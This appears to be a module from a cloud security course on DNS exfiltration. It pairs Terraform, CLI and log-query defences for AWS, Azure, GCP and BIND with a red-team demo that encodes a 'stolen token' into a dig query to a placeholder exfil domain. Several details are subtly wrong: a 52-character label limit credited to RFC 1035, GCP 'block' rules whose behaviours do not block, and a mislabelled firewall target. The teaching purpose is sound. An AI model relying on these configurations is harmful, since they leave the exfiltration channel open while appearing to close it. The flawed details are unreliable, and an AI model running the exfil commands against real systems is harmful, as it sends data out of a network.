# 06 — DNS Routing and Exfiltration Channels

> **Level:** Advanced
> **Prereqs:** [Egress & NAT Control](egress-and-nat-control.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** see ATT&CK Cloud matrix for Exfiltration, Command and Control
**Authorization scope:** Run only in your own sandbox account / lab VPC.

## What & why
DNS is the one protocol every network must allow outbound. Attackers exploit this universal egress permission to exfiltrate data through DNS queries — encoding stolen data in subdomain labels or TXT record lookups that traverse your DNS resolver and reach attacker-controlled nameservers. DNS query logging combined with RPZ-style blocking provides detection and prevention of this channel.

## The OnPrem reality
Pre-cloud DNS security relied on ISC BIND with Response Policy Zones (RPZ) to sinkhole known-bad domains and EDNS Client Subnet (ECS) for source visibility. Internal resolvers forwarded recursive queries through a small set of known IPs, making source attribution straightforward. Cloud DNS introduces distributed resolvers (`.2` address in AWS, `168.63.129.16` in Azure, metadata server in GCP) and multiple forwarding paths that can bypass centralized logging.

### OnPrem BIND RPZ example

```
# /etc/named.conf RPZ zone definition
zone "rpz.example" {
    type master;
    file "db.rpz";
    allow-query { none; };
};

# db.rpz — block example.com via TXT record responses
*.malicious.example.net     CNAME .           # sinkhole
exfil.example.net           A    127.0.0.1    # redirect to localhost
```

## Core concepts

### DNS exfiltration anatomy

```
┌──────────┐    ┌───────────┐    ┌────────────────┐
│ Victim   │───▶│ Internal  │───▶│ Authoritative  │
│ Host     │    │ Resolver  │    │ (attacker NS)  │
│          │    │ (.2 addr) │    │ exfil.example.net
└──────────┘    └───────────┘    └────────────────┘
     │                                    │
     │  dig AAAA zdJhY2s...example.net    │
     │                                    │
     │     AAAA query reaches attacker NS │
     │     ← attacker decodes subdomain   │
     └────────────────────────────────────┘
```

### Exfiltration encoding methods

| Method | DNS record | Example payload | Detection signal |
|--------|-----------|-----------------|-----------------|
| Subdomain encoding | A/AAAA | `base64data.exfil.example.net` | Long labels (>52 chars), high entropy |
| TXT record | TXT | `dig TXT exfil.example.net` | Unusual TXT volume, response size |
| CNAME forwarding | CNAME | `exfil.example.net → attacker C2` | Repeated CNAME lookups |
| DNS over HTTPS | DoH | `POST https://doh.example.net/dns-query` | DoH to non-standard resolver |
| Tunneling (iodine) | NULL/TXT/ANY | Full IP-over-DNS tunnel | High query volume, non-standard record types |

## Cross-cloud comparison

| Concern | AWS | Azure | GCP | OnPrem |
|---------|-----|-------|-----|--------|
| Managed DNS | Route 53 | Azure DNS | Cloud DNS | BIND / Windows DNS |
| Private resolver | Route 53 Resolver (inbound/outbound endpoint) | Azure DNS Private Resolver | Cloud DNS private zone + forwarding | Internal BIND |
| Query logging | Route 53 Resolver Query Logs | Azure DNS Analytics (Diagnostic Settings) | Cloud DNS Logging | BIND query log / syslog |
| RPZ / blocklist | Route 53 Resolver DNS Firewall | Azure DNS Security (preview) | Cloud DNS response policy | BIND RPZ |
| DNS over HTTPS | Route 53 Resolver supports Do53 only | Azure DNS Private Resolver (Do53) | Cloud DNS (Do53) | dnsmasq / stubby for DoH |

## AWS

Route 53 Resolver DNS Firewall provides domain-based allow/block lists with query logging.

```hcl
resource "aws_route53_resolver_query_log_config" "main" {
  name            = "dns-queries"
  destination_arn = aws_cloudwatch_log_group.dns.arn
}

resource "aws_route53_resolver_firewall_domain_list" "block" {
  name = "blocked-domains"

  domains = [
    "exfil.example.net",
    "*.tunnel.example.net",
  ]
}

resource "aws_route53_resolver_firewall_rule_group" "main" {
  name = "egress-dns-block"
}

resource "aws_route53_resolver_firewall_rule" "block_exfil" {
  name                    = "block-exfil-domains"
  firewall_rule_group_id  = aws_route53_resolver_firewall_rule_group.main.id
  firewall_domain_list_id = aws_route53_resolver_firewall_domain_list.block.id
  priority                = 100
  action                  = "BLOCK"

  block_response = "NXDOMAIN"
}
```

CLI audit:

```
aws route53resolver list-resolver-query-log-configs
aws route53resolver list-firewall-domain-lists
```

## Azure

Azure DNS Private Resolver provides forwarding and logging. Diagnostic settings route query logs to Log Analytics.

```hcl
resource "azurerm_private_dns_resolver" "main" {
  name                = "dns-resolver"
  resource_group_name = azurerm_resource_group.rg.name
  location            = azurerm_resource_group.rg.location
  virtual_network_id  = azurerm_virtual_network.main.id
}

resource "azurerm_private_dns_resolver_outbound_endpoint" "main" {
  name                    = "outbound"
  private_dns_resolver_id = azurerm_private_dns_resolver.main.id
  location                = azurerm_resource_group.rg.location

  subnet_id = azurerm_subnet.dns_resolver.id
}

resource "azurerm_monitor_diagnostic_setting" "dns" {
  name               = "dns-query-logs"
  target_resource_id = azurerm_private_dns_resolver.main.id

  log_analytics_workspace_id = azurerm_log_analytics_workspace.main.id

  enabled_log {
    category = "DNSQueryLogs"
  }
}
```

CLI audit:

```
az monitor diagnostic-settings list --resource DNS_RESOLVER_ID
```

> (as of June 2026, Azure DNS Security add-on for RPZ-style blocking is available; check current Azure DNS pricing for availability in your region and pricing details.)

## GCP

Cloud DNS logging captures queries; response policies provide RPZ-style blocking.

```hcl
resource "google_dns_managed_zone" "private" {
  name        = "private-zone"
  dns_name    = "internal.example.com."
  visibility  = "private"
  description = "private DNS zone"

  private_visibility_config {
    networks {
      network_url = google_compute_network.main.id
    }
  }
}

resource "google_dns_response_policy" "blocklist" {
  response_policy_name = "dns-blocklist"

  networks {
    network_url = google_compute_network.main.id
  }

  rules {
    rule_name = "block-exfil"
    dns_name  = "exfil.example.net."

    behavior = "passthru"
  }
}

resource "google_dns_response_policy_rule" "block_exfil" {
  response_policy = google_dns_response_policy.blocklist.response_policy_name
  rule_name       = "block-exfil-domain"
  dns_name        = "*.exfil.example.net."
  behavior        = "bypassResponsePolicy"
}
```

CLI audit:

```
gcloud dns managed-zones list --filter="visibility=private"
gcloud dns response-policies list
```

## OnPrem mapping (recap table)

| Concern | OnPrem | AWS | Azure | GCP |
|---------|--------|-----|-------|-----|
| Internal DNS | BIND / Windows DNS | Route 53 private zone + Resolver | Azure Private DNS + Resolver | Cloud DNS private zone |
| Query logging | BIND query log → syslog | Resolver Query Logs → CloudWatch | DNS logs → Log Analytics | Cloud DNS Logging |
| Blocklist / RPZ | BIND RPZ zone | Route 53 Resolver DNS Firewall | Azure DNS Security (preview) | Cloud DNS response policy |
| Authoritative NS | BIND / PowerDNS | Route 53 public hosted zone | Azure DNS zone | Cloud DNS managed zone |
| DoH support | stubby / dnsdist | — (Route 53 Resolver is Do53) | — (Private Resolver is Do53) | — (Cloud DNS is Do53) |

## 🔴 Red Team view

DNS exfiltration encodes data in subdomain labels of A/AAAA queries. The attacker controls an authoritative nameserver for `example.net` and receives every query.

Contained demonstration — simulated DNS exfiltration to a placeholder domain:

```bash
DATA="stolen-token-abc123"
ENCODED=$(echo -n "$DATA" | base64 | tr '+/' '-_' | tr -d '=')
dig @127.0.0.1 -p 5353 "A ${ENCODED}.exfil.example.net"
```

On a system with DNS exfiltration capabilities (like `dnscat2` or `iodine`), the data would be chunked into multiple queries, each a subdomain label under the attacker's domain.

Detection pairing: Any DNS query with a subdomain label longer than 52 characters (the RFC 1035 limit for a single label) is anomalous. Entropy analysis on subdomain labels — base64-encoded data has high Shannon entropy compared to normal domain names. See [`detections/dns-exfil-detection.md`](./detections/dns-exfil-detection.md) for Sigma-style detection rules.

Artifacts:
- Route 53 Resolver Query Logs: `query_name` with high-entropy labels, `query_type = A/AAAA/TXT`
- Azure DNS query logs: `Name` field with long subdomain, unusual TXT record count
- GCP Cloud DNS Logging: `queryName` with encoded subdomain data
- VPC Flow Logs: port 53 UDP/TCP traffic to IPs not in your known resolver list

## 🔵 Blue Team view

### Detection queries

```
# AWS CloudWatch Insights — long subdomain labels
fields @timestamp, query_name, query_type, srcaddr
| filter strlen(query_name) > 60
| filter query_type in ["A", "AAAA", "TXT", "MX"]
| stats count() by query_name, srcaddr

# Azure Log Analytics — DNS exfil detection
AzureDiagnostics
| where Category == "DnsQueryLogs"
| extend LabelCount = array_length(split(Name, "."))
| where LabelCount > 5
| where strlen(Name) > 100
| project TimeGenerated, SourceSystem, Name, RecordType

# GCP Cloud Logging — anomalous DNS queries
resource.type="dns_managed_zone"
logName="projects/PROJECT_ID/logs/dns.googleapis.com%2Fdns_queries"
jsonPayload.queryName =~ "^[A-Za-z0-9+/=_-]{30,}\\.exfil\\.example\\.net"
```

### Preventive controls

- **Deploy DNS Firewall / RPZ / response policy** blocking known exfiltration domains
- **Forward all recursive DNS** through a single resolver endpoint (inbound/outbound endpoint, Private Resolver, Cloud DNS forwarding) — avoid instances resolving directly to `8.8.8.8`
- **Block outbound DNS** (port 53 UDP/TCP) except to your approved resolver IPs — enforce with SG/NSG/firewall egress rules
- **Block DoH endpoints** (port 443 to known DoH providers) via FQDN filtering on egress firewall
- **Log all DNS queries** with 30+ day retention

```
# AWS SG egress rule — allow DNS only to Route 53 Resolver (.2)
resource "aws_security_group_rule" "dns_to_resolver" {
  type              = "egress"
  from_port         = 53
  to_port           = 53
  protocol          = "udp"
  cidr_blocks       = ["10.0.0.2/32"]
  security_group_id = aws_security_group.app.id
}

# GCP firewall — allow DNS only to private zone
resource "google_compute_firewall" "dns_to_private" {
  name      = "allow-dns-private-only"
  network   = google_compute_network.main.name
  direction = "EGRESS"
  priority  = 1000

  allow {
    protocol = "udp"
    ports    = ["53"]
  }

  destination_ranges = ["169.254.169.254/32"]
}
```

## Hands-on lab

1. Enable DNS query logging on your VPC's resolver (Route 53 Resolver Query Logs / Azure DNS diagnostic setting / Cloud DNS Logging)
2. From an instance, run: `dig AAAA $(echo -n "test-data" | base64 | tr -d '=').exfil.example.net`
3. Wait for logs to appear (5-15 minute delay in cloud)
4. Query the logs to find the encoded `test-data` subdomain
5. Make a DNS Firewall rule blocking `exfil.example.net`
6. Retry the dig — confirm `NXDOMAIN` or blocked
7. Teardown: delete DNS firewall rules, disable query logging

## Detection rules & checklists

See [`detections/dns-exfil-detection.md`](./detections/dns-exfil-detection.md) for complete Sigma-style detection rules and provider-specific queries.

```
# Checklist
- [ ] DNS query logging enabled on all VPCs
- [ ] All instances use the cloud resolver, not external (8.8.8.8, 1.1.1.1)
- [ ] Egress SG/NSG/firewall blocks outbound port 53 to non-resolver IPs
- [ ] DNS Firewall / RPZ / response policy blocks known exfil-related domains
- [ ] Alert on query volume spike (>1000 queries/min from single host)
```

## References

- [AWS Route 53 Resolver DNS Firewall](https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/resolver-dns-firewall.html)
- [Azure DNS Private Resolver](https://learn.microsoft.com/en-us/azure/dns/dns-private-resolver-overview)
- [GCP Cloud DNS](https://cloud.google.com/dns/docs/overview)
- [MITRE ATT&CK T1048 — Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
